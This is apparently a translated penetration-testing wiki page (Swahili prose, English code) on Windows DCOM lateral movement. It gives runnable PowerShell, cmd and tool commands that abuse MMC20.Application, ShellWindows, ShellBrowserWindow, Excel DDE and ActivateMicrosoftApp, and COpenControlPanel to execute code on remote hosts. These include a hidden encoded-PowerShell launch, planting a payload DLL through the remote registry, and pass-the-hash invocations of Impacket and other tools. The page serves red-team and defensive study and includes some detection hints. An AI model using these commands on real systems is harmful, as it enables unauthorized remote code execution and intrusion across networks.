# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement inavutia kwa sababu hutumia tena COM servers zilizopo zinazoonekana kupitia RPC/DCOM badala ya kuunda service au scheduled task. Kwa vitendo, hii humaanisha kuwa muunganisho wa awali kwa kawaida huanza kwenye TCP/135 kisha kuhamia kwenye high RPC ports zilizotengewa dynamically.

## Masharti ya Awali na Changamoto

- Kwa kawaida unahitaji local administrator context kwenye target, na remote COM server lazima iruhusu remote launch/activation.
- Tangu **Machi 14, 2023**, Microsoft hutekeleza DCOM hardening kwa supported systems. Old clients zinazoomba low activation authentication level zinaweza kushindwa isipokuwa zinegotiate angalau `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Modern Windows clients kwa kawaida huinuliwa kiotomatiki, hivyo current tooling kwa kawaida huendelea kufanya kazi.<sup>[[3]](#references)</sup>
- Manual au scripted DCOM execution kwa ujumla huhitaji TCP/135 pamoja na target's dynamic RPC port range. Ikiwa unatumia Impacket's `dcomexec.py` na unataka command output irudi, kwa kawaida pia unahitaji SMB access kwenye `ADMIN$` (au share nyingine yenye uwezo wa kusomeka/kuandikika).
- Ikiwa RPC/DCOM inafanya kazi lakini SMB imezuiwa, `dcomexec.py -nooutput` bado inaweza kuwa muhimu kwa blind execution.

Ukaguzi wa haraka:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

Kwa maelezo zaidi kuhusu technique hii, angalia [chapisho la awali kuhusu MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM) objects hutoa uwezo wa kuvutia kwa ajili ya mwingiliano wa objects unaotegemea network. Microsoft hutoa nyaraka za kina kuhusu DCOM na Component Object Model (COM), zinazopatikana [hapa kwa ajili ya DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) na [hapa kwa ajili ya COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Orodha ya DCOM applications inaweza kupatikana kwa kutumia command ya PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
Kitu cha COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), huwezesha uendeshaji wa scripting wa shughuli za MMC snap-in. Muhimu zaidi, kitu hiki kina method ya `ExecuteShellCommand` chini ya `Document.ActiveView`. Maelezo zaidi kuhusu method hii yanaweza kupatikana [hapa](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Ijaribu ikiendelea:<sup>[[6]](#references)</sup>

Kipengele hiki hurahisisha utekelezaji wa commands kupitia network kwa kutumia DCOM application. Ili kuingiliana na DCOM remotely kama admin, PowerShell inaweza kutumika kama ifuatavyo:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Amri hii inaunganisha kwenye application ya DCOM na kurudisha instance ya COM object. Kisha method ya ExecuteShellCommand inaweza kuitwa ili kutekeleza process kwenye remote host. Mchakato unahusisha hatua zifuatazo:

Kagua methods:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Pata RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Hoja ya mwisho ni mtindo wa dirisha. `7` huweka dirisha katika hali ya minimized. Kivitendo, execution inayotumia MMC kwa kawaida husababisha process ya mbali ya `mmc.exe` ku-spawn payload yako, ambayo ni tofauti na objects zinazotumia Explorer zilizo hapa chini.

## ShellWindows & ShellBrowserWindow

**Kwa maelezo zaidi kuhusu technique hii, angalia post ya awali [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Object ya **MMC20.Application** ilibainika kutokuwa na "LaunchPermissions" iliyo wazi, hivyo hutumia permissions za default zinazoruhusu Administrators kupata access. Kwa maelezo zaidi, thread inaweza kuchunguzwa [hapa](https://twitter.com/tiraniddo/status/817532039771525120), na inashauriwa kutumia OleView .NET ya [@tiraniddo](https://twitter.com/tiraniddo) kuchuja objects zisizo na Launch Permission iliyo wazi.

Objects mbili maalum, `ShellBrowserWindow` na `ShellWindows`, ziliangaziwa kwa sababu hazina Launch Permissions zilizo wazi. Kutokuwepo kwa registry entry ya `LaunchPermission` chini ya `HKCR:\AppID\{guid}` kunaashiria kutokuwepo kwa permissions zilizo wazi.

Ikilinganishwa na `MMC20.Application`, objects hizi mara nyingi huwa tulivu zaidi kwa mtazamo wa OPSEC kwa sababu command kwa kawaida huishia kuwa child ya `explorer.exe` kwenye host ya mbali badala ya `mmc.exe`.

### ShellWindows

Kwa `ShellWindows`, ambayo haina ProgID, methods za .NET `Type.GetTypeFromCLSID` na `Activator.CreateInstance` hurahisisha object instantiation kwa kutumia AppID yake. Mchakato huu hutumia OleView .NET kupata CLSID ya `ShellWindows`. Baada ya ku-instatiate, interaction inawezekana kupitia method ya `WindowsShell.Item`, na kusababisha method invocation kama `Document.Application.ShellExecute`.

Mifano ya PowerShell commands ilitolewa kwa ajili ya ku-instatiate object na kutekeleza commands remotely:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` inafanana, lakini unaweza kuiunda moja kwa moja kupitia CLSID yake na kufanya pivot kwenda `Document.Application.ShellExecute`:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Lateral Movement kupitia Excel DCOM Objects

Lateral movement inaweza kufanikishwa kwa kutumia vibaya DCOM Excel objects. Kwa maelezo ya kina, inashauriwa kusoma mjadala kuhusu kutumia Excel DDE kwa lateral movement kupitia DCOM kwenye [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

Mradi wa Empire unatoa PowerShell script inayoonyesha matumizi ya Excel kwa remote code execution (RCE) kupitia udhibiti wa DCOM objects. Hapa chini kuna vipande kutoka kwenye script inayopatikana kwenye [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), vinavyoonyesha mbinu mbalimbali za kutumia Excel vibaya kwa RCE:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Utafiti wa hivi karibuni ulipanua eneo hili kwa kutumia method ya `ActivateMicrosoftApp()` ya `Excel.Application`. Wazo kuu ni kwamba Excel inaweza kujaribu kuzindua applications za zamani za Microsoft kama vile FoxPro, Schedule Plus, au Project kwa kutafuta kwenye mfumo wa `PATH`. Ikiwa operator anaweza kuweka payload yenye mojawapo ya majina yanayotarajiwa katika eneo linaloweza kuandikwa ambalo ni sehemu ya `PATH` ya target, Excel itaitekeleza.<sup>[[4]](#references)</sup>

Mahitaji ya variation hii:

- Local admin kwenye target
- Excel iwe imesakinishwa kwenye target
- Uwezo wa kuandika payload kwenye directory inayoweza kuandikwa ndani ya `PATH` ya target

Mfano wa vitendo wa kutumia vibaya FoxPro lookup (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Ikiwa host inayoshambulia haina `Excel.Application` ProgID iliyosajiliwa locally, unda object ya mbali kwa kutumia CLSID badala yake:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Thamani zinazoonekana kutumiwa vibaya katika mazingira halisi:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — kupakia Control Panel DLL iliyosajiliwa

Class ya `COpenControlPanel` (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) hufichua `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`). Method yake ya `Open()` husababisha Control Panel DLL zilizosajiliwa chini ya key ya `Control Panel\Cpls` kupakiwa na `dllhost.exe` ya mbali. Class hii haina launch/access permissions zilizoainishwa wazi kwenye mifumo iliyojaribiwa, kwa hivyo hurithi default DCOM policy (ambayo kwa kawaida huhitaji administrator kwa remote activation). Jina lolote la item linatosha kufanya `Open()` ichakate DLL zilizosajiliwa; payload haihitaji extension ya `.cpl`, ingawa lazima iwe DLL halali ya architecture sahihi.<sup>[[7]](#references)</sup>

Primitive hii ni **stage-and-trigger**, si execution ya amri pekee: kwanza nakili DLL kwenye target na uunde value ya `REG_EXPAND_SZ` inayoielekeza, kisha activate object kupitia DCOM. Kwa mfano, kutoka kwenye Windows context yenye administrative privileges:<sup>[[7]](#references)</sup>
```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```
Mteja wa public [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) hutekeleza wito wa DCOM usio na nyaraka kwa kutumia Impacket. Kutoa jina lolote la kipengee cha Control Panel kunatosha; mteja anaweza kuripoti hitilafu ya RPC ingawa `dllhost.exe` imepakia DLL.<sup>[[8]](#references)</sup>
```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```
Kwa upande wa uendeshaji, njia hii pia inahitaji njia ya kuandika faili na ufikiaji wa registry ya mbali, hivyo hutoa kelele zaidi kuliko `MMC20`/`ShellWindows`. Huunda athari ya persistence kwa sababu kufungua Control Panel baadaye kunaweza kupakia ingizo hilo tena. Ondoa value baada ya utekelezaji na tafuta values zisizotarajiwa za `Control Panel\Cpls` pamoja na upakiaji usio wa kawaida wa DLL katika `dllhost.exe`.<sup>[[7]](#references)</sup>
```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```
### Zana za Automation za Lateral Movement

Zana mbili zimeangaziwa kwa ajili ya ku-automate techniques hizi:

- **Invoke-DCOM.ps1**: PowerShell script iliyotolewa na Empire project inayorahisisha kuita methods tofauti za ku-execute code kwenye machines za remote. Script hii inapatikana kwenye Empire GitHub repository.

- **SharpLateral**: Tool iliyoundwa kwa ajili ya ku-execute code remotely, ambayo inaweza kutumiwa kwa command:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Automatic Tools

- Powershell script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) inaruhusu kwa urahisi kutumia njia zote zilizowekwa maoni za kutekeleza code kwenye mashine nyingine.
- Unaweza kutumia `dcomexec.py` ya Impacket kutekeleza commands kwenye mifumo ya mbali kwa kutumia DCOM. Builds za sasa zinaunga mkono `ShellWindows`, `ShellBrowserWindow`, na `MMC20`, na kwa chaguo-msingi hutumia `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Unaweza pia kutumia [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Unaweza pia kutumia [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## References

- [1] [Lateral Movement kwa kutumia MMC20.Application COM Object](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Lateral Movement kupitia DCOM: Round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Kusimamia mabadiliko ya Windows DCOM Server Security Feature Bypass (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: Kutumia vibaya uwezo wa DCOM Excel Application](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Kutumia Excel DDE kwa Lateral Movement kupitia DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [Kutumia DCOM objects kwa remote command execution](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
{{#include ../../banners/hacktricks-training.md}}
